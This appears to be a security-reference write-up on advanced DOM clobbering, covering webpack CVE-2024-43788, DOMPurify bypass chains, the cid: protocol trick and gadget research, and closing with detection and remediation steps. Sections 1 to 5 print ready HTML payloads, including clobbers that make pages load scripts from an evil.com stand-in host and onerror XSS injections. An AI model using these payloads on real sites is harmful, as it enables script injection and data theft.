# 55 - Advanced DOM Clobbering Techniques

## Overview

DOM clobbering exploits the browser's behavior of creating global JavaScript variables from HTML elements with `id` or `name` attributes. When an application accesses a global variable that happens to match a clobbered element, the element (or its properties) is returned instead of the expected value. This document covers advanced DOM clobbering techniques from 2024-2026, including the webpack CVE-2024-43788, DOMPurify bypass chains, the `cid:` protocol trick, and the Hulk research finding 497 zero-day gadgets.

**Sources**: [Tenable - CVE-2024-43788](https://tenable.com/cve/CVE-2024-43788), [mizu.re - DOMPurify Bypasses](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes), [PortSwigger - DOM Clobbering Lab](https://portswigger.net/web-security/dom-based/dom-clobbering), [buer.haus - DOM Clobbering in the Wild](https://buer.haus/2024/02/23/go-go-xss-gadgets-chaining-a-dom-clobbering-exploit-in-the-wild/)

---

## 1. webpack CVE-2024-43788: DOM Clobbering in Build Tool Runtime

### 1.1 Vulnerability Details

**Affected versions**: webpack 5.0.0-beta.32 through 5.93.0
**Fixed in**: webpack 5.94.0
**CVSS**: High
**Real-world exploitation**: Confirmed in Canvas LMS

**Vulnerability**: A DOM clobbering gadget in webpack's `AutoPublicPathRuntimeModule` allows XSS when a page contains attacker-controlled HTML elements (e.g., an `<img>` tag with an unsanitized `name` attribute). The runtime code uses global variable lookups to determine the public path for loading chunks, and these lookups can be clobbered.

### 1.2 Technical Analysis

webpack's runtime code for auto-detecting the public path does:

```javascript
// Simplified webpack AutoPublicPathRuntimeModule
var scriptUrl;
if (typeof import.meta.url === 'string') {
  scriptUrl = import.meta.url;
}
// ... or falls back to document.currentScript / document.scripts
var scripts = document.getElementsByTagName('script');
if (scripts.length) {
  scriptUrl = scripts[scripts.length - 1].src;
}
```

An attacker can clobber the expected DOM properties to control `scriptUrl`, which is then used to construct URLs for dynamic chunk loading:

```html
<!-- Clobber to control webpack's public path -->
<img name="currentScript" src="https://evil.com/chunks/">
```

### 1.3 Exploitation

```html
<!-- DOM clobbering payload for webpack CVE-2024-43788 -->
<a id="__webpack_public_path__" href="https://evil.com/"></a>

<!-- Alternative: clobber via img name -->
<img name="__webpack_public_path__" src="https://evil.com/">

<!-- When webpack loads dynamic chunks, they load from evil.com -->
```

**Impact**: webpack loads JavaScript chunks from the attacker-controlled URL, achieving arbitrary code execution. No known workarounds exist -- updating to 5.94.0+ is required.

**Key insight**: DOM clobbering in build tool runtime code (not just application code) can contain exploitable gadgets. This means even well-secured application code can be vulnerable through its bundler's output.

**Source**: [Tenable](https://tenable.com/cve/CVE-2024-43788), [GitHub Advisory GHSA-4vvj-4cpr-p986](https://db.fluidattacks.com/adv/npm/webpack/CVE-2024-43788)

---

## 2. DOMPurify Bypass Chains (3.1.0 and 3.1.2)

### 2.1 DOMPurify 3.1.0 Bypass (April 2024)

**Vulnerability**: The fix in DOMPurify 3.1.0 for a previous bypass introduced a new vulnerability. The `.parentNode` property access used for depth tracking could be clobbered, allowing an attacker to reset the depth count and bypass sanitization.

**Mechanism**: DOMPurify tracks DOM tree depth during traversal to prevent deeply-nested mutation XSS. By clobbering `.parentNode` on specific elements, the depth counter can be manipulated:

```html
<!-- Clobber parentNode to reset depth tracking -->
<form id="x">
  <input name="parentNode">
  <img src=x onerror=alert(1)>
</form>
```

### 2.2 DOMPurify 3.1.2 Bypass: Second-Order Clobbering

**Vulnerability**: The fix applied in DOMPurify 3.1.1 used a `__depth` attribute for tracking. This attribute itself could be clobbered via second-order DOM clobbering, defeating the fix.

**Mechanism**: Second-order clobbering means clobbering a property that the sanitizer uses internally, rather than clobbering the final output:

```html
<!-- Second-order clobber targeting DOMPurify's internal __depth attribute -->
<form id="DOMPurify">
  <input name="__depth" value="0">
</form>
<img src=x onerror=alert(1)>
```

### 2.3 Pattern of DOMPurify Clobbering Bypasses

The repeated sequence of DOMPurify bypasses (3.1.0 -> 3.1.1 -> 3.1.2) demonstrates that the interaction between sanitizers and DOM clobbering is fundamentally difficult to secure:

1. **3.1.0**: Clobber `.parentNode` to break depth tracking
2. **3.1.1 fix**: Use `__depth` attribute instead of `.parentNode`
3. **3.1.2**: Clobber `__depth` attribute itself
4. **Subsequent fix**: More robust depth tracking independent of DOM properties

**Lesson**: Sanitizers must not rely on DOM properties or custom attributes for internal state, since these can be clobbered by attacker-controlled HTML.

**Source**: [mizu.re](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes)

---

## 3. The `cid:` Protocol Trick

### 3.1 How It Works

DOMPurify allows the `cid:` protocol (Content-ID, used in MIME/email contexts) in URL attributes. Unlike most allowed protocols, `cid:` does not URL-encode double quotes. This means a `cid:` URL can contain unescaped `"` characters that break out of the attribute context.

### 3.2 Exploitation

```html
<!-- DOMPurify allows cid: protocol -->
<!-- The double quote in the cid: URL breaks out of the href attribute -->
<a href="cid:&quot; onclick=alert(1)//">Click</a>

<!-- When clobbered variable is read, the cid: URL survives sanitization -->
<a id="defaultAvatar" href='cid:"onerror=alert(1)//'>
```

**Chain with DOM clobbering**:
1. Inject an `<a>` element with `id` matching a variable the application reads
2. Set `href` to a `cid:` URL containing an XSS payload with unescaped quotes
3. Application reads `window.defaultAvatar` (clobbered by the `<a>` element)
4. Application uses `.href` property, which contains the unsanitized payload
5. Payload executes when rendered in a sink

**Source**: [PortSwigger Lab - DOM XSS via DOM Clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering)

---

## 4. Hulk Research: 497 Zero-Day DOM Clobbering Gadgets

### 4.1 Research Overview

Academic research on DOM clobbering gadgets at scale has identified hundreds of exploitable patterns in the wild. The Hulk framework scanned websites and JavaScript libraries for code patterns that:

1. Access global variables without explicit declaration
2. Use the accessed value in a dangerous sink (innerHTML, script.src, eval, etc.)
3. The global variable name matches a plausible HTML `id` or `name` attribute

### 4.2 Key Findings

- **497 zero-day DOM clobbering gadgets** identified across popular websites and libraries
- Gadgets were found in jQuery, Google Analytics, advertising scripts, and build tool outputs
- Many gadgets involve configuration objects accessed via global variables:
  ```javascript
  // Gadget pattern: global config object used unsafely
  if (window.appConfig) {
    document.getElementById('banner').innerHTML = window.appConfig.message;
  }
  // Clobber: <a id="appConfig" href="cid:x"><a id="appConfig" name="message" href="javascript:alert(1)">
  ```

### 4.3 Common Gadget Patterns

| Pattern | Example | Sink |
|---------|---------|------|
| Global config lookup | `window.config.apiUrl` | `script.src`, `fetch()` |
| Feature flag check | `window.features.debug` | `eval()`, `innerHTML` |
| Error handler lookup | `window.errorHandler` | `Function()` call |
| Template reference | `window.templates.header` | `innerHTML` |
| Analytics endpoint | `window.analyticsUrl` | `new Image().src` |

### 4.4 Multi-Level Clobbering

Accessing nested properties (e.g., `window.config.apiUrl`) requires multi-level DOM clobbering. This is achieved using HTMLCollection behavior with multiple elements sharing the same `id`:

```html
<!-- Multi-level clobber: window.config.apiUrl -->
<a id="config" href="ignored"></a>
<a id="config" name="apiUrl" href="https://evil.com/xss.js"></a>

<!-- The browser creates an HTMLCollection for window.config -->
<!-- window.config.apiUrl resolves to the second <a> element -->
<!-- Reading .href gives "https://evil.com/xss.js" -->
```

**Three-level clobbering** (e.g., `window.a.b.c`) is possible using `<form>` elements with named inputs:

```html
<form id="a" name="b">
  <input name="c" value="payload">
</form>
<!-- window.a.b.c.value === "payload" -->
```

---

## 5. DOM Clobbering Payloads

```html
<!-- DC-01: webpack AutoPublicPath clobber -->
<a id="__webpack_public_path__" href="https://evil.com/"></a>

<!-- DC-02: Multi-level clobber for config object -->
<a id="config" href="x"></a>
<a id="config" name="apiUrl" href="https://evil.com/xss.js"></a>

<!-- DC-03: DOMPurify parentNode clobber (< 3.1.1) -->
<form><input name="parentNode"><img src=x onerror=alert(1)></form>

<!-- DC-04: cid: protocol attribute breakout -->
<a id="defaultUrl" href='cid:"onerror=alert(1)//'>

<!-- DC-05: Form-based three-level clobber -->
<form id="app" name="settings"><input name="debug" value="true"></form>

<!-- DC-06: Image name clobber for document properties -->
<img name="domain" src="evil.com">

<!-- DC-07: Anchor clobber for toString override -->
<a id="redirectUrl" href="javascript:alert(1)">

<!-- DC-08: Multiple anchors for HTMLCollection clobber -->
<a id="endpoints"></a><a id="endpoints" name="auth" href="//evil.com/auth">

<!-- DC-09: Object/embed clobber -->
<object id="config" data="data:text/html,<script>alert(1)</script>"></object>

<!-- DC-10: Named form fields for nested access -->
<form id="user"><input name="role" value="admin"><input name="token" value="stolen"></form>
```

---

## 6. Detection and Remediation

### 6.1 Detection

- Search application code for unguarded global variable access patterns: `window.X`, `document.X`, or bare `X` where `X` is not explicitly declared
- Use ESLint rule `no-implicit-globals` to identify variables that could be clobbered
- Audit webpack and build tool output for clobberable patterns
- Check DOMPurify version for known clobbering bypasses

### 6.2 Remediation

1. **Declare variables explicitly**: Use `const`/`let`/`var` for all variables
2. **Use `hasOwnProperty` checks**: Verify properties exist on the intended object
3. **Freeze configuration objects**: `Object.freeze(config)` prevents clobbering
4. **Avoid named element access**: Do not rely on `window.elementId` patterns
5. **Update DOMPurify**: Use the latest version to get clobbering-resistant sanitization
6. **Update webpack**: Upgrade to 5.94.0+ to fix the AutoPublicPath gadget
7. **Use `Map` for dynamic lookups**: `Map` objects cannot be clobbered
